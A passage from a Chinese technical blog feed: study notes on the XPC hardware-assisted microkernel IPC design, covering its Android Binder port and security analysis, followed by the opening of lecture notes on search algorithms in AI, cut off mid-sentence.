<code>seg-reg</code>；</p></li></ul><p>回顾一下之前遇到的问题，relay memory segment 如何更改区域的 ownership？</p><p>实际上，OS Kernel 会确保<strong>每片 relay memory segment 只会被一个 CPU core 访问</strong>（也就是说同一时间只会有一个线程拥有访问这个区域的能力），并且所有权会随着 calling chain 传递，解决 ownership 转移、减小 TOCTTOU 风险的同时，避免直接修改页表导致 TLB 击穿。</p><p>还有在 <code>xret</code> 时重要的安全逻辑：返回前检查 callee 本身的 <code>seg-reg</code> 和调用时的状态是一致的（<strong>通过检查 link stack 上的 <code>seg-reg &amp; seg-mask</code> 与当前 <code>seg-reg</code> 指定范围是否匹配</strong>），如果不一致，则说明有恶意的 callee 把不恢复原先的 <code>seg-reg</code>，而是 swap 到 <code>seg-list</code> 中。如果 check 失败，则会向 Kernel 抛出异常。</p><blockquote><p>总结一下每个表现在所处的位置：</p><ul><li><code>x-entry-table</code>：全局内存（Kernel space）；</li><li><code>xcall-cap-bitmap</code>：per-thread memory，被 Kernel 管理，由 <code>xcall-cap-reg</code> 指向；</li><li><code>link-stack</code>：per-thread memory，只被 Kernel 访问，由 <code>link-reg</code> 指向；</li><li><code>relay-segment-list</code>：per-process memory，被 Kernel 管理，由 <code>seg-list-reg</code> 指向；</li><li>relay memory segment: continuous physical memory，可被服务端创建多个，由 <code>seg-reg</code> / <code>seg-list-entry</code> 指向；</li><li><code>seg-reg</code> 寄存器：同时有虚拟地址和物理地址，随着 calling chain 传递，每个线程自己可以通过修改 <code>seg-mask</code> 来改变传给 callee 的内存范围；</li></ul><p>前 4 个就是 Kernel 帮忙管理，后一个需要 Kernel 帮忙 check no overlap；</p><p>中途在出现 context switch 时，会 save/restore <strong>per-thread</strong> objects；</p><p>思考：各个寄存器放的是物理地址还是虚拟地址？</p></blockquote><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="RocketChip-Microkernel"><a href="#RocketChip-Microkernel" class="headerlink" title="RocketChip (Microkernel)"></a>RocketChip (Microkernel)</h3><ul><li>XPC Engine -&gt; a unit of a RocketChip core;</li><li>新寄存器 -&gt; <code>CSRs</code>（Control &amp; Status Registers），通过 <code>csrr / csrw</code> 指令访问；</li><li>新指令 <code>xcall / xret / swapseg</code> 会在 Execution Stage 向 XPC Engine 发送（不涉及内核）；</li><li>新增 5 类 exceptions；</li><li>默认实现不含  x-entry-table 的 cache，为了最小化硬件改动；如果改动，则使用 1 entry 作为缓存，使用软件管理，在 prefetch 时调用 <code>xcall -#reg</code>；</li></ul><p>权限转移（Capability）：XPC 这套架构提供一套 “赋予能力” 的功能，这个就是 <code>grant-cap</code>；这个功能也由 Kernel 管理。一个线程创建 <code>x-entry</code> 时就拥有对这个 <code>x-entry</code> 的 <code>xcall-cap</code> 以及赋予这个能力的 <code>grant-cap</code>，现在这个线程可以给指定线程赋予 <code>xcall-cap</code> 的能力；</p><p>单次调用 C-Stack: XPC 支持一个 server 的 <code>x-entry</code> 同时被多个 clients invoke；XPC library 会提供一种 per-invocation XPC context，其中包括了一个 execution stack 和 local data，用来支持多个 clients 同时进行跨进程调用；</p><p>每创建一个 <code>x-entry</code> 就能针对这个 entry 设定最大的 context 数，XPC library 会提前创建这些 context 并向 <code>x-entry</code> 绑定一个 “跳板”；当 clients invoke 这个 <code>x-entry</code> 后，XPC library 就按此跳板恢复 C-stack 以及 local data，并在 return 前释放资源；如果没有空闲的 context，则抛出错误或者等待空闲的 context 出现；</p><blockquote><p>也可能出现 Dos 攻击，假设一个恶意的 client 频繁 invoke 某个 <code>x-entry</code>，耗尽了这个 entry 的 context。</p><p>对于这个问题，XPC 允许 server 指定策略限制 clients 访问 entry，又或者引入信用系统；</p></blockquote><p>调用链的异常终止与断开策略：假设 xcall 的调用链 A -&gt; B -&gt; C 中，B 因为某些原因被 Kernel kill 了；如果此时 C xret 了，则可能返回到错误的进程。为了解决这种情况，在调用链中途的进程被 kill 后需要引发一个 exception 让 Kernel 处理。</p><p>解决方法是，在一个进程结束后，让 Kernel 扫描一遍 link stack，找到死去的进程并将 valid 位置为 0，这样在 C xret 时校验 valid 会发现问题并抛出 exception，Kernel 就可以将无效的 stack entry pop 出去，程序控制流能够返回 A 进程中；</p><p>另一种减少 scan table 的方式是，在 B 死去后，直接将 top level page table 清零，这样在 C xret 时会触发 page fault，Kernel 会介入并回收 B 的资源（为什么？参见 “<code>seg-reg</code> handover” 的讨论）；</p><h3 id="Android-Binder"><a href="#Android-Binder" class="headerlink" title="Android Binder"></a>Android Binder</h3><p>Android Binder: driver + framework (C++ middleware) + API (Android interface definition language)</p><ul><li><p>binder transaction -&gt; cross-process method invoke; </p></li><li><p>twofold-copy &amp; transaction buffer -&gt; transfer data;</p><p>anonymous shared memory (ashmem) -&gt; bulk memory transfer;</p></li></ul><p>其中，原先的 binder transaction 过程如下：</p><ol><li>client 准备 method code（代表 remote method），在调用时携带集中好的数据（Android 中的 parcels）；</li><li>client binder 对象调用 <code>transact()</code>，通过 AB driver 复制 user space 中的 transaction buffer 到 kernel 中（<code>copy_from_user</code>），再切到 server side 从 kernel 中复制出来（<code>copy_to_user</code>）（两次复制，两次 domain switch，称 twofold copy）；</li><li>Binder Framework 的 server side 收到请求并触发预先准备的 <code>onTransact()</code>；</li><li>最终控制流回到 server，server 可以通过 AB driver 回复；</li></ol><p>XPC 对此的优化方式是：</p><ul><li>不修改 IPC interfaces（<code>transact/onTransact</code>）确保应用兼容性；</li><li>extend binder driver 来定义管理 <code>xcall-cap</code> 和 <code>x-entry table</code> 的能力；</li><li>当应用调用 binder interface 的 <code>addService</code> 注册服务时，修改后的 framework 会向 binder driver 触发 <code>ioctl</code> 指令来添加一个 <code>x-entry</code>；</li><li>对于使用 <code>getService</code> 准备调用对应服务的 client 而言，framework 会 <code>set-xcap</code> 来保证 client 有权访问对应的 <code>x-entry</code>；</li><li>上面都是准备工作。在 client 真正调用 remote method 的时候，<strong>使用 <code>xcall / xret</code> 指令，并且用 relay memory segment 实现 parcels 来完成 data transfer</strong>。期间注意 kernel 还是需要管理 per-thread XPC registers；</li></ul><p>这样期间的 domain switch 以及 memory copying 都被消除了；</p><p>此外，Android 的 anonymous shared memory 子系统向 user space 提供一套基于文件共享内存的接口。虽然类似匿名内存，但是借助共享 file descriptor 来向其他进程共享映射方案的。进程既可以使用 mmap 也可以用 file I/O；</p><p>和其他 share memory 来在进程间共享内存的方法一样，ashmem 需要多进行一次额外的 copy 来规避 TOCTTOU 风险，这会造成性能损失。于是 XPC 优化如下：</p><ul><li>ashmem 分配：更改 framework 在分配 ashmem 时用 driver 分配一段 relay memory segment；</li><li>ashmem 映射：map 动作会将位于物理内存上的 relay memory segment 分配到虚拟内存上，设置 <code>seg-reg</code> 寄存器；</li><li>ashmem 所有权转移：仅通过 framework 调用 xcall 是传递 <code>seg-reg</code> 来完成；</li></ul><p>不过一般情况下同一时间只有一个活跃的 relay memory segment。如果一个应用需要同时访问多个 relay memory segment，可以借助 page fault（隐式）或 使用 <code>swapseg</code>（显式）切换 relay memory segment；</p><h3 id="seg-reg-handover"><a href="#seg-reg-handover" class="headerlink" title="seg-reg handover"></a><code>seg-reg</code> handover</h3><p>在 calling chain 传递 <code>seg-reg</code> 想法是好的，但实际上还会遇到一些问题：</p><ul><li>如果需要一部分一部分传递 relay memory segment 的内容，应该怎么办？</li><li>我们在上面讨论 “调用链异常终止” 的情况时，只是采取措施不至于返回到错误的进程，但死去的进程的资源（例如它所创建的所有 relay segment memory，还不能被其他 relay memory 或页表使用）。应该在什么时机释放它们？</li><li>传递过程中可能出现追加信息的情况（例如网络栈会追加头部包数据），如果这个时候超过 relay memory segment 大小怎么办？</li></ul><p>第一个问题很简单，就利用 <code>seg-mask</code> 像滑动窗口一样向 callee 传递其中一段内存即可；</p><p>第二个问题，在触发异常进入 Kernel 后，Kernel 除了 pop invalid link stack entry 或者将 dead process 的首级页表清零以外，还可以扫描 <code>seg-list</code>，恢复 caller 原来的 relay segment，同时释放掉这个进程分配的其他 relay segments；</p><p>第三个问题，需要 Message Size Negotiation；如果存在一个调用链 <code>A -&gt; B -&gt; [C | D]</code>（B 可能调用 C 也可能调用 D），那么：</p><script type="math/tex; mode=display">S_{\text{all}}(A)=S(\text{msg})+S_{\text{all}}(B)=S(\text{msg})+S_{\text{self}}(B)+\max\{S_{\text{all}}(C)+S_{\text{all}}(D)\}</script><p>其中 $S_{\text{all}}(X)$ 表示 $X$ 需要的所有空间，$S_{\text{self}}(X)$ 表示 $X$ 在自己的 logic 中需要追加的内容所占空间；</p><h2 id="测试评估"><a href="#测试评估" class="headerlink" title="测试评估"></a>测试评估</h2><p>优化对比：</p><ul><li>partial context</li><li>tagged TLB</li><li>Nonblock link stack（write）</li><li>XPC Engine cache（1 entry prefetch）</li></ul><h3 id="Microbenchmark"><a href="#Microbenchmark" class="headerlink" title="Microbenchmark"></a>Microbenchmark</h3><ul><li>One-way call</li><li>Multi-core IPC：因为采用了 migrating thread model，跨核调用的性能并没有明显下降；</li></ul><h3 id="OS-Services"><a href="#OS-Services" class="headerlink" title="OS Services"></a>OS Services</h3><ul><li>file system</li><li>network</li></ul><h3 id="Android-Binder-1"><a href="#Android-Binder-1" class="headerlink" title="Android Binder"></a>Android Binder</h3><p>limitations: 仅支持同步 IPC（异步 IPC 像 death notification 还尚未实现），并且没有实现 split thread state 来应对 Kernel 的 trap，而是充分利用在 RISC-V 中的 “machine mode” 来捕获 xcall 和 xret 期间发生的异常。</p><blockquote><p>MACHINE MODE ？</p><p>Machine Mode (M-mode) in RISC-V is the highest privilege level in the architecture, primarily used for low-level system control and management. Here are some key points about M-mode:</p><ol><li><strong>Privilege Level</strong>: M-mode has full access to all resources and can execute any instruction without restrictions. It is designed for the operating system kernel and hardware abstraction layers.</li><li><strong>Bootstrapping</strong>: When a RISC-V system powers on or resets, it starts execution in M-mode. This allows it to initialize hardware components and set up lower privilege modes (User Mode and Supervisor Mode).</li><li><strong>Control Registers</strong>: M-mode can configure and control various system registers and hardware features, such as interrupts, timers, and memory management.</li><li><strong>Exception Handling</strong>: M-mode is responsible for handling exceptions and interrupts. When a higher privilege level (e.g., Supervisor Mode) generates an exception, control can be transferred to M-mode for processing.</li><li><strong>Delegation</strong>: M-mode can delegate certain exceptions and interrupts to Supervisor Mode, allowing for a structured and layered approach to handling system events.</li><li><strong>Memory Protection</strong>: M-mode can configure the memory protection settings for lower privilege levels, ensuring safe execution of applications.</li></ol><p>Overall, M-mode provides the foundational control necessary for managing the RISC-V system, enabling the efficient execution of higher-level software components.</p></blockquote><h2 id="硬件开销优化"><a href="#硬件开销优化" class="headerlink" title="硬件开销优化"></a>硬件开销优化</h2><p>资源 utilization 可以进一步优化，例如使用 Verilog 替代 RocketChip 中的 Chisel；</p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h3 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h3><p><strong>XPC 认证和识别</strong>：</p><p>一个 caller 如果没有对应的 <code>xcall-cap</code>，则不能直接通过 <code>xcall ID</code> 来触发一次 XPC；这个 <code>xcall-cap</code> 一般是需要向注册服务的 server（具有对应的 <code>grant-cap</code> 能力）申请，类似 08 年的一篇文章介绍的 CuriOS 中 name server 一样；</p><p>其次，一个 callee 可以通过 <code>xcall-cap-reg</code> 指向的 bitmap 来确定 caller 的身份，而这个寄存器在 <code>xcall</code> 时会被 XPC Engine 放在 general purpose register（RISC-V 中是 <code>t0</code>）中，无法被伪造。</p><p><strong>针对 TOCTTOU 的防护</strong>：</p><p>XPC 机制中，一个 relay segment 可以通过 <code>reg-seg</code> 在进程进程间传递，同一时刻最多只有一个线程拥有这片空间。并且 Kernel 会保证不会有与 page table 规定区域 overlap 的情况出现。</p><p><strong>调用链故障隔离</strong>：</p><p>在 XPC 调用链 <code>A -&gt; B -&gt; C</code> 上，任意一个进程 crash 后，总是能回到上级 caller 中继续执行。这主要是 XPC Engine 定义的机制：某进程死亡后 Kernel 会扫描一遍 link stack entry，invalid 掉无效的 process（或者进行 top level page table 清零的操作），在 <code>xret</code> 触发 exception 时再 pop 掉；同时扫描 <code>seg-list</code> 释放归属于无效进程的空间、恢复原先 caller 的 <code>seg-reg</code>、relay segment list 等等。</p><blockquote><p>注意：不能在进程刚结束就释放 relay segment lists，而是在调用链返回出错时才释放。因为我们需要死亡进程在调用时的 <code>seg-reg</code> 数据，以通过 xret 的检验。</p></blockquote><p>除此以外，XPC 还可以支持超时机制，但是实际使用时经常设置为 0 或者 $+\infty$，经常会出现没有用的情况。</p><p><strong>DoS Attacks 防御</strong>：</p><p>一种 DoS Attacks 的方式是，请求创建大量的 relay-segment，占用连续的物理内存空间，造成比较多的 external fragments；但 XPC Engine 会把 relay-seg 放在 process 的 private address space 上，因此这样本身既不会影响 Kernel 也不会影响其他进程；</p><blockquote><p>PRIVATE ADDRESS SPACE ？</p><p>因为在创建 relay segment 的时候选取的是连续的物理地址，类似 Android Binder Ashmem 创建和映射的过程，会把这个物理地址映射到当前进程的私有地址空间，然后再更改 <code>seg-reg</code> / 推入 <code>seg-list</code>，因此说使用的是 process 的private address space；</p></blockquote><p>另一种 DoS Attacks 的方式是，频繁调用 callee，消耗 x-entry 对应的 pre-invocation C-Stack（context &amp; data）；这个通过 credit system 解决，callee 可以在接受调用前检查 caller 的信用分，如果过低就不分配 XPC context 给它；</p><p><strong>Timing Attacks 防御</strong>：</p><p>首先 XPC Engine cache 比较少，发生的可能性小；其次可以像 tagged-TLB 一样，通过 tag cache entry 实现 thread-private 的形式阻隔一个线程感知其他线程的 cache，进一步减小 timing attack 的可能。</p><h3 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h3><ul><li>scalable <code>xcall-cap</code>：将 bitmap 换成 radix tree，但是会增大内存开销，使得 IPC 性能下降；</li><li>Relay Page Table：提高 relay segment 的空间利用率，可以把 segment 换成类似二层页表的结构，但是 ownership transfer 就比较难做，而且只支持以一页为粒度的内存控制；</li></ul><h2 id="其他相关工作"><a href="#其他相关工作" class="headerlink" title="其他相关工作"></a>其他相关工作</h2><p>We revisit previous IPC optimizations in this section.</p><h3 id="Domain-Switch"><a href="#Domain-Switch" class="headerlink" title="Domain Switch"></a>Domain Switch</h3><ul><li>protected procedure call (LRPC) / migrating thread（software，<strong>trap</strong>）</li></ul><p><img src="imgs/migrating-thread.png" /></p><p><img src="imgs/ppc.png" /></p><p>​    这种方法的好处是什么？</p><p>​    <strong>Eliminates the scheduling latency and mitigates IPC logic overhead !</strong></p><ul><li><p>CODOMs、CHERI（hardware）：</p><p>The switch can be done directly at unprivileged level without trapping to the kernel, which is a huge advantage against software optimizations. Meanwhile, multiple domains can share one address space (<strong>single address space</strong>), which can further reduce the overhead of TLB miss after domain switch. However, these systems usually require non-trivial changes to existing micro-kernels which are designed for address space based isolation mechanism.</p><p>（不仅硬件上需要大改，软件上也不支持现有的基于内存地址空间隔离的 micro-kernels）；</p></li></ul><h3 id="Message-Copying"><a href="#Message-Copying" class="headerlink" title="Message Copying"></a>Message Copying</h3><ul><li><p>LRPC（software）：reduce twofold copy（caller -&gt; kernel -&gt; callee） to one（caller -&gt; shared memory）；</p><p>TOCTTOU 发生机制：在 callee 检查完成 shared memory 中的 messsage 有效性和安全性之后准备执行时，caller 通过精巧的时间掌控（例如利用 trap）在期间更改了 shared memory 的内容为恶意数据或代码；</p><p>但是如果再从 shared memory 中 copy 一次，那就丧失了节省一次 copy 的优势了；</p></li><li><p>remapping page ownership（software）: kernel involved &amp; TLB shootdown；</p><p>而且 remapping page 粒度在 page 级别，很难在 calling chain 中 handover（对 shared memory 也是）；</p></li><li><p>temporary mapping（software）：kernel 找到 callee 中 unmapping area，把它和 caller 的 communication window（一种位于 caller address space 中，但只能被 Kernel 访问的空间）map 到一起；当 caller 向 Kernel 请求发送把消息 copy 到 communication window 并 send 之后，caller 本身是无法继续访问这块空间，杜绝了 TOCTTOU 的风险，但是：1 次 copy、remapping + TLB shootdown、kernel involved 仍然会带来不可忽略的开销；</p></li><li><p>CODOMs（hardware）：hybrid memory granting mechanism（permission list + capability registers），但是同样存在 ownership 的问题（哪个线程有这个寄存器的值就能访问）。不过由于使用 single address space，因此 tagged memory 来实现隔离，并且能降低 TLB shootdown 带来的开销；</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是一篇 2019 年的关于微内核 IPC 性能优化的文章。&lt;/p&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;微内核有很多引人注目的 features，例如 安全性、容错性、</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="OS" scheme="https://blog.sjtuxhw.top/tags/OS/"/>
    
    <category term="IPC" scheme="https://blog.sjtuxhw.top/tags/IPC/"/>
    
    <category term="MicroKernel" scheme="https://blog.sjtuxhw.top/tags/MicroKernel/"/>
    
  </entry>
  
  <entry>
    <title>Algorithms in AI</title>
    <link href="https://blog.sjtuxhw.top/technical/algo-in-ai/"/>
    <id>https://blog.sjtuxhw.top/technical/algo-in-ai/</id>
    <published>2024-07-20T07:23:40.000Z</published>
    <updated>2024-10-25T13:53:07.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-Intro"><a href="#Chapter-0-Intro" class="headerlink" title="Chapter 0. Intro"></a>Chapter 0. Intro</h1><h2 id="0-1-The-definition-of-Artificial-Intelligence"><a href="#0-1-The-definition-of-Artificial-Intelligence" class="headerlink" title="0.1 The definition of Artificial Intelligence"></a>0.1 The definition of Artificial Intelligence</h2><ul><li><p>Think rationally -&gt; Think like people -&gt; Act like people -&gt; <strong>Act rationally</strong>.</p><blockquote><p>The system <strong>maximumly achieving predefined goals</strong>.</p><p>-&gt; <strong>Maximize the expected utility.</strong> (最大化预期效用)</p></blockquote></li><li><p>Brains and AI</p><ul><li><p>Why not reverse engineering the brains? -&gt; Not as modular as software.</p></li><li><p>But there are the lessons <strong>learned from the brain</strong> (interleave, 交织在一起):</p><ul><li><p><strong>Memory (data): Judge situations depending on the previous experiences (statistics)</strong>.</p><blockquote><p>e.g., Bayes’ nets, Decision theory, <strong>Machine learning</strong>,…</p></blockquote></li><li><p><strong>Simulation (computation): Predict the future depending on the models</strong>.</p><blockquote><p>e.g., Search, Satisfying constraints, Adversarial and uncertain search,… (<strong>Algorithms</strong>)</p></blockquote></li></ul></li></ul></li></ul><h2 id="0-2-The-History-of-AI"><a href="#0-2-The-History-of-AI" class="headerlink" title="0.2 The History of AI"></a>0.2 The History of AI</h2><h2 id="0-3-The-Applications-of-AI"><a href="#0-3-The-Applications-of-AI" class="headerlink" title="0.3 The Applications of AI"></a>0.3 The Applications of AI</h2><ul><li><strong>Natural language</strong>: speech technology (+context), language processing technologies (Q&amp;A / translation / web search …);</li><li><p><strong>Computer vision</strong> (perception)</p></li><li><p><strong>Game playing</strong>;</p></li><li><strong>Logic</strong>: Theorems provers, NASA fault diagnosis, …</li></ul><h2 id="0-4-Designing-Rational-Agents"><a href="#0-4-Designing-Rational-Agents" class="headerlink" title="0.4 Designing Rational Agents"></a>0.4 Designing Rational Agents</h2><ul><li>Agent: An agent is an entity that perceives and acts.</li><li><strong>Environment -&gt; sensors of an agent -&gt; agent functions -&gt; actuators -&gt; effect on environment</strong>.</li></ul><h1 id="Chapter-1-Search"><a href="#Chapter-1-Search" class="headerlink" title="Chapter 1. Search"></a>Chapter 1. Search</h1><blockquote><p>Discuss agents that <strong>plan ahead</strong> rather than just react to a current situation.</p><p><strong>将现实问题 formalize 为数学问题，并使用算法模拟搜索求解</strong>。</p></blockquote><h2 id="1-1-Reflex-Agents"><a href="#1-1-Reflex-Agents" class="headerlink" title="1.1 Reflex Agents"></a>1.1 Reflex Agents</h2><ul><li><p>They have a current percept, <strong>and maybe make decision based on these memory but <u>without consideration of the consequences of their actions</u>.</strong></p><blockquote><p>仅根据当前状态，直接进行当前最优动作；</p><p>例如，根据当前 successor 的结果谁更接近 goal 就进行什么操作。</p></blockquote></li><li><p>类似贪心算法，有时 rational，但有时并不是；</p></li></ul><h2 id="1-2-Planing-Agents"><a href="#1-2-Planing-Agents" class="headerlink" title="1.2 Planing Agents"></a>1.2 Planing Agents</h2><ul><li><p>They have the model of what the world works, and the goals. <strong>根据一系列动作，结合模型假设后果，并根据后果和目标的关系来决定是否进行这个操作</strong>。</p><blockquote><p>实现 1 (master-mind)：先遍历查找动作序列，再行动（时间花费很大）；</p><p>实现 2 (re-planning)：先遍历最近的动作序列，行动，然后再遍历下一段的动作序列，再行动，以此往复（类似结合了贪心法的动态规划）；</p></blockquote></li><li><p>Optimal Planning（最优计划） &amp; Complete Planning（能解决问题的存在性计划）</p></li></ul><h2 id="1-3-Search-Problem（Uninformed-Search）"><a href="#1-3-Search-Problem（Uninformed-Search）" class="headerlink" title="1.3 Search Problem（Uninformed Search）"></a>1.3 Search Problem（Uninformed Search）</h2><h3 id="1-3-1-Definitions"><a href="#1-3-1-Definitions" class="headerlink" title="1.3.1 Definitions"></a>1.3.1 Definitions</h3><blockquote><p>什么是计算机中的搜索问题？</p></blockquote><ul><li><p>一个搜索问题包含：</p><ul><li><p>状态空间（a state space，存放环境信息）；</p></li><li><p>后继函数（a successor function，包含动作、动作开销）；</p><blockquote><p><strong>有哪些可行的动作？动作执行后的结果状态如何？——这个函数编码了 “how the world works”</strong></p></blockquote></li><li><p>初始状态（a start state）和目标检查（a goal test）；</p></li></ul></li><li><p>搜索问题的解：<strong>就是一个从初始状态到目标状态的动作序列（a sequence of actions / a plan）</strong>.</p></li></ul><blockquote><p><strong>以上可以称为搜索问题的模板，可以看作接口（interface）</strong>，这意味着我们可以将现实生活中的问题抽象到上面的模板中（casting to search problem），再对照模板设计算法，就能解决实际问题。</p></blockquote><h3 id="1-3-2-Examples"><a href="#1-3-2-Examples" class="headerlink" title="1.3.2 Examples"></a>1.3.2 Examples</h3><blockquote><p>搜索问题本质上是一个模型。举例：</p></blockquote><ul><li>城市导航路线图<ul><li>state space: cities;</li><li>successor function: roads (go to adjacent cities with <strong>cost (可以是距离、交通情况等)</strong>);</li><li>start state: 位于起点的状态；</li><li>goal test: <strong>当前状态是否是位于终点的状态</strong>；</li><li>solution: 有向路径；</li></ul></li><li>pac-man 游戏（目标是走到指定位置）<ul><li>state space: (x, y) 实体的位置信息；action: NSEW；successor function: <strong>update location only</strong>；goal test: 是否有 (x,y)==DESTINATION；</li></ul></li><li>pac-man 游戏（目标是吃完所有豆子）<ul><li>state space: (x, y) 位置 + 是否有食物的布尔值；action: NSEW；successor function: <strong>更新位置和食物情况</strong>；goal test: 是否有所有食物布尔值都为 false；</li></ul></li></ul><h3 id="1-3-3-Mathematical-amp-Algorithmic-Representation"><a href="#1-3-3-Mathematical-amp-Algorithmic-Representation" class="headerlink" title="1.3.3 Mathematical &amp; Algorithmic Representation"></a>1.3.3 Mathematical &amp; Algorithmic Representation</h3><ul><li><p><strong>搜索问题的数学表示：状态图和搜索树</strong>（state space graphs &amp; search tree）</p><ul><li><strong>它们一般过于庞大，画不出来，只需要有这样的概念就行</strong>；</li><li>搜索树结点数一般远大于状态图，因为<strong>搜索树中可以有多个结点代表同一个状态</strong>；</li></ul></li><li><p>搜索树（General Tree Search）解决 <strong>等权 / 非等权搜索问题</strong></p><blockquote><p>本部分就是数据结构中图的相关算法。涉及解决<strong>等权图最短路</strong>、<strong>非等正权图最短路</strong>等问题的经典算法。但<strong>有所不同，因为是 Tree Search，所以不会记录 visited 结点——意味着会重复搜索（具体会在 1.5 中进行阐释和改进）</strong>；</p></blockquote><ul><li><p>Important Ideas:</p><ul><li><strong>Fringe (原义条纹 / 边缘，这里指的是 a set of leaf nodes that are waiting to be expanded，通常是存放等待处理的数据结点的结构，可以是栈、队列等)</strong>;</li><li>Expansion (查找过程中再向树中插入合法结点);</li><li>Exploration strategy (<strong>DFS / BFS / Uniform Cost Search</strong>)</li></ul></li><li><p>Pseudo Code:</p><p><img src="imgs/tree_search_pseudo_code.png"></p></li></ul></li><li><p>Search Algorithm Properties of General Tree Search（<strong>针对所有 “利用搜索树” 解决搜索问题的算法</strong>）</p><ul><li><p><strong>如果 expansion strategy 算法是 DFS</strong>：</p><ul><li>实现方式：<strong>栈</strong>；</li><li>时间复杂度为 $O(b^m)$，b 为每个结点的后继结点数量级，m 为搜索树中最大深度的数量级；空间复杂度为 $O(b\cdot m)$；</li><li><strong>算法是 complete 的（如果对于无限树，且存在解，则能够找到至少一个解）</strong>；</li><li><strong>算法不是 optimal 的（DFS 无法自动找到最优解，除非你一直找，再手动比较）</strong>；</li></ul></li><li><p><strong>如果算法是 BFS</strong>：</p><ul><li>实现方式：<strong>队列</strong>；</li><li>时间复杂度为 $O(b^s)$，b 为每个结点的后继结点数量级，s 为搜索到最近的 goal state 所在层数的数量级；空间复杂度也是 $O(b^s)$;</li><li><strong>算法是 complete 的</strong>（不遍历结束、得出结果，则不会退出）；</li><li><strong>如果 cost 是相等的——即等权图，则算法是 optimal 的，因为按照层级（tier）从近处向远处找</strong>；</li></ul></li><li><p>综合上面特点发现，DFS 空间性能更好，但 BFS 能够找到等权情况下的最短路；<strong>那么我们有没有一种算法综合它们的优点呢？有的！它就是 Iterative Deepening</strong>；</p><blockquote><p><strong>Iterative Deepening（迭代深搜）</strong>利用了 DFS 空间优势。在搜索开始后，先执行 DFS，<strong>以 depth=1 和 goal 为终止条件</strong>，如果找到，就结束；否则证明 depth=1 的深度无解，将 depth 结束条件放宽至 depth=2，继续 DFS，以此类推。</p><p>这就将 DFS 和 BFS 的优势结合了起来。</p><p>不用担心每次都把前几层重复检查，因为理论上搜索树每层结点指数增长，下一层结点数往往远大于前几层结点数之和，所以重复检查的部分微不足道。</p></blockquote></li><li><p>Uniform Cost Search（UCS，一致代价搜索） 解决 <strong>Cost-sensitive Search（非等权搜索问题）</strong></p><ul><li>实现方式：<strong>优先级队列</strong>；</li><li>时间复杂度 $O(b^{C^*/\varepsilon})$，b 为每个结点后继结点数量级，C* 为解的 cost 数量级，ε 为各个结点间（每一步）的最小 cost 数量级；空间复杂度与时间相同； </li><li>此算法借鉴了 BFS 的思路，在 expansion 的时候选取 cost 最小的；</li><li><strong>算法在<u>最小权为正数</u>的情况下是 complete 和 optimal 的</strong>。</li><li>优点很好，但缺点也很严重——<strong>一般情况下开销极大，因为遍历了一个正权下的所有状态结点</strong>（可以通过 goal 的信息进行优化，后面介绍，就是 <strong>informed search</strong>）；</li></ul></li></ul></li></ul><h2 id="1-4-Informed-Search"><a href="#1-4-Informed-Search" class="headerlink" title="1.4 Informed Search"></a>1.4 Informed Search</h2><blockquote><p>搜索问题的定义是相同的，只不过 informed search（有提示搜索）的 <strong>expanding strategy</strong> 会考虑到距离 goal 的远近程度（在 uninformed search 的基础上进行改进）而已。</p><p>所以下面仅比较不同的 expanding strategy。</p></blockquote><h3 id="1-4-1-Search-Heuristics"><a href="#1-4-1-Search-Heuristics" class="headerlink" title="1.4.1 Search Heuristics"></a>1.4.1 Search Heuristics</h3><blockquote><p>启发式搜索，<strong>即启发函数</strong>，是后面 informed search 算法的基础。</p></blockquote><ul><li><p>The definition for a heuristic</p><ul><li><p>A function that estimates <strong>how close a state is to a goal</strong>.</p></li><li><p>Designed for a particular search problem （<strong>因为距离判断因问题而异</strong>）；</p><blockquote><p>可以是 Manhattan distance，Euclidean distance……（for pathing）</p></blockquote></li></ul></li><li><p>Examples</p><ul><li>The pac-man game（去往特定的有食物的地点）：“距离”（heuristic function）可以是与终点的欧式距离、曼哈顿距离（因为上下左右移动）；</li><li>The pancake problem（完成从上到下饼依此增大的排列）：heuristics function 可以是<strong>位置正确的煎饼个数</strong>、<strong>位置不正确的最大煎饼编号（因为和汉诺塔类似，势必要先把最大煎饼先挪到底层）</strong>；</li></ul><blockquote><p>具体选择哪种 heuristic function，<strong>可以举几种固定情况（例如画一部分状态图），看谁的 heuristic function 的值在接近 goal 时表现更好</strong>。</p></blockquote></li></ul><h3 id="1-4-2-Expanding-Strategy-Greedy-Search（贪婪法）"><a href="#1-4-2-Expanding-Strategy-Greedy-Search（贪婪法）" class="headerlink" title="1.4.2 Expanding Strategy: Greedy Search（贪婪法）"></a>1.4.2 Expanding Strategy: <strong>Greedy Search（贪婪法）</strong></h3><ul><li>思路：选择 fringe 中 heuristic function 最接近 goal 的结点进行 expand；</li><li>优点：在某些情况下搜索非常迅速，并且开销很小；</li><li>缺陷：局部最优解不一定是全局最优解，即贪婪法不一定是正确的（<strong>算法不一定是 optimal 的</strong>），最坏情况是 <strong>badly-guided DFS</strong>，尤其是当 heuristics function 没选好的时候；</li></ul><h3 id="1-4-3-Expanding-Strategy-A-Search（A-搜索）"><a href="#1-4-3-Expanding-Strategy-A-Search（A-搜索）" class="headerlink" title="1.4.3 Expanding Strategy: A* Search（A* 搜索）"></a>1.4.3 Expanding Strategy: <strong>A* Search（A* 搜索）</strong></h3><blockquote><p>理解 A star Search 前，先以龟兔赛跑的寓言故事（fable）作比：<strong>Uniform Cost Search (uninformed)</strong> 就像 tortoise，虽然缓慢，但会搜索到同一权重下的所有状态情况，如果有的话确保一定找到最优解；<strong>Greedy Search</strong> 就像 hare，非常迅速，但容易走错方向，找不到最优解。</p><p><strong>所以 A star search 相当于是坐在乌龟上的兔子，既结合了 Uniform Cost Search 的稳妥，又具有 Greedy Search 部分的借助 heuristic function 迅速搜索的特点</strong>。现在看看是如何实现的：</p></blockquote><p>以一个例子来阐释：</p><p><img src="imgs/AStar.png" height="275"></p><p>对于这个正权有向图而言，Uniform Cost 